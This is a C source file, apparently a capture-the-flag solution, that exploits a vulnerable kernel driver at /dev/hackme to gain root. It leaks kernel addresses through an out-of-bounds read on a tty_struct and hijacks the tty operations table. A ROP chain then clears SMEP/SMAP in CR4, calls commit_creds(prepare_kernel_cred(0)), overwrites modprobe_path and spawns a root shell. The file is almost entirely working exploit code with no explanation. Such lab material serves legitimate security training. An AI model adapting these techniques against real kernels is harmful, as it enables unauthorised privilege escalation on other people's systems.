// gcc exploit.c -masm=intel -fno-PIE -static -no-pie -o exploit
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

size_t read(int fd, void *buf, size_t count);
size_t write(int fd, void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
unsigned long strlen(const char *s);
int puts(const char *s);

void get_root(void* func);
void shell(void);
void exploit(void);

static void dump(void *buf, unsigned long size);
static void save_state(void);
static void restore_state(void);

struct state {
	unsigned long rip;
	unsigned long cs;
	unsigned long rflags;
	unsigned long rsp;
	unsigned long ss;
} stat;

/* exploit */
#define BASE			0xffffffff81000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	(kernel_base + (offset))

unsigned long kernel_base				= 0;
unsigned long ofs_pty_unix98_ops		= OFFSET(0xffffffff81625c60);
unsigned long ofs_modprobe_path			= OFFSET(0xffffffff8183f960);

unsigned long ofs_prepare_kernel_cred	= OFFSET(0xffffffff8104d3d0);
unsigned long ofs_commit_creds			= OFFSET(0xffffffff8104d220);

unsigned long ofs_stack_pivot 			= OFFSET(0xffffffff81083b55);	// mov esp, 0xF6000000 ; ret
unsigned long ofs_pop_rdi				= OFFSET(0xffffffff81033de0);	// pop rdi ; ret
unsigned long ofs_pop_rax				= OFFSET(0xffffffff8101b5a1);	// pop rax ; ret
unsigned long ofs_pop_rcx				= OFFSET(0xffffffff81633ad8);	// pop rcx ; ret
unsigned long ofs_pop_rsp				= OFFSET(0xffffffff810484f0);	// pop rsp ; ret
unsigned long ofs_popfq					= OFFSET(0xffffffff8101b5b1);	// popfq ; ret
unsigned long ofs_mov_rdi_rax_pop		= OFFSET(0xffffffff810161ae);	// mov rdi, rax ; rep movsq  ; pop rbp ; ret
unsigned long ofs_swapgs_pop2			= OFFSET(0xffffffff81200c2e);	// swapgs  ; popfq  ; pop rbp ; ret
unsigned long ofs_mov_cr4_eax_pop1		= OFFSET(0xffffffff8100252b);	// mov cr4, eax ; push rcx ; popfq  ; pop rbp ; ret
unsigned long ofs_iretq					= OFFSET(0xffffffff81019356);

struct cred* (*prepare_kernel_cred)(struct task_struct *daemon); 
int (*commit_creds)(struct cred *new);
char *modprobe_path;

struct hackme {
	unsigned int index;
	void *addr;
	unsigned long size;
	unsigned long offset;
};

static int hm_add(int fd, unsigned long id, void *buf, unsigned long size);
static int hm_delete(int fd, unsigned long id);
static int hm_edit(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset);
static int hm_read(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset);

void main(void){
	int fd, pfd;
	unsigned long tty_struct[0x400/sizeof(unsigned long)] = {};
	unsigned long fake_operation[0x20] = {};
	unsigned long *fake_stack;
	unsigned long kernel_stack[0x10] = {};

	save_state();
	stat.rip = shell;

	if((fd = open("/dev/hackme", O_RDONLY)) < 0){
		perror("open /dev/hackme failed");
		exit(-1);
	}

	pfd = open("/dev/ptmx", O_NOCTTY|O_RDWR);
	hm_add(fd, 0, tty_struct, 0x400);
	hm_read(fd, 0, tty_struct, 0x400, -0x400);

	unsigned long pty_unix98_ops	= tty_struct[3];
	kernel_base			= pty_unix98_ops - ofs_pty_unix98_ops;
	prepare_kernel_cred	= ADDR(ofs_prepare_kernel_cred);
	commit_creds		= ADDR(ofs_commit_creds);
	modprobe_path 		= ADDR(ofs_modprobe_path);
	printf("[+] kernel_base		= %p\n", kernel_base);

	unsigned long kernel_heap	= tty_struct[8]-0x38 + 0x400;
	printf("[+] kernel_heap		= %p\n", kernel_heap);

	fake_operation[0x15] = ADDR(ofs_swapgs_pop2);
	fake_operation[0x13] = ADDR(ofs_stack_pivot);
	hm_edit(fd, 0, fake_operation, sizeof(fake_operation), 0);

	tty_struct[0x3] = kernel_heap;
	hm_edit(fd, 0, tty_struct, 0x400, -0x400);

	if((fake_stack = mmap((void*)(0xf6000000-0x1000), 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0)) != (void*)(0xf6000000-0x1000)){
		perror("mmap failed");
		exit(-3);
	}
	fake_stack += (0x1000/sizeof(unsigned long));
	*(fake_stack++) = ADDR(ofs_pop_rax);
	*(fake_stack++) = 0x6b0;						// new cr4
	*(fake_stack++) = ADDR(ofs_mov_cr4_eax_pop1);
	*(fake_stack++) = 0xdeadbeef;
	*(fake_stack++) = ADDR(ofs_popfq);
	*(fake_stack++) = 0x202;						// new rflags
	*(fake_stack++) = ADDR(ofs_pop_rdi);
	*(fake_stack++) = shell;
	*(fake_stack++) = get_root;

	close(pfd);
}

static int hm_add(int fd, unsigned long id, void *buf, unsigned long size){
	struct hackme req = {
		.index = id,
		.addr = buf,
		.size = size,
		.offset = 0,
	};
	return ioctl(fd, 0x30000, &req);
}

static int hm_delete(int fd, unsigned long id){
	struct hackme req = {
		.index = id,
		.addr = NULL,
		.size = 0,
		.offset = 0,
	};
	return ioctl(fd, 0x30001, &req);
}

static int hm_edit(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset){
	struct hackme req = {
		.index = id,
		.addr = buf,
		.size = size,
		.offset = offset,
	};
	return ioctl(fd, 0x30002, &req);
}

static int hm_read(int fd, unsigned long id, void *buf, unsigned long size, unsigned long offset){
	struct hackme req = {
		.index = id,
		.addr = buf,
		.size = size,
		.offset = offset,
	};
	return ioctl(fd, 0x30003, &req);
}

/* funcs */
static void dump(void *buf, unsigned long size){
	unsigned long *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(int i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}

static void save_state(void) {
	register long *rsp asm("rsp");

	asm(
	"mov rax, ss\n"
	"push rax\n"
	"lea rax, [rsp+0x18]\n"
	"push rax\n"
	"pushfq\n"
	"mov rax, cs\n"
	"push rax\n"
	"mov rax, [rbp+8]\n"
	"push rax\n"
	);
	memcpy(&stat, rsp, sizeof(stat));
    asm("add rsp, 0x28");
}

static void restore_state(void){
	register long *rsp asm("rsp");

    asm("sub rsp, 0x28");
	memcpy(rsp, &stat, sizeof(stat));
    asm(
	"swapgs\n"
	"iretq"
	);
	__builtin_unreachable();
}

void *memset(void *s, int c, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(s+i) = (char)c;
	return s;
}

void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

unsigned long strlen(const char *s){
	unsigned long i;
	for(i=0; s[i]; i++);
	return i;
}

int puts(const char *s){
	int n;

	n = write(1, (void*)s, strlen(s));
	write(1, "\n", 1);

	return n;
}

void get_root(void* func){
	commit_creds(prepare_kernel_cred(0));

	char new_path[] = "/home/pwn/exploit.sh";
    asm("swapgs");
	memcpy(modprobe_path, new_path, sizeof(new_path));

	stat.rip = func;
	restore_state();
}

void shell(void){
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

asm(
"read:\n"
"mov rax, 0\n"
"syscall\n"
"ret\n"

"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"mprotect:\n"
"mov rax, 10\n"
"syscall\n"
"ret\n"

"munmap:\n"
"mov rax, 11\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"

"exit:\n"
"mov rax, 60\n"
"syscall\n"
);

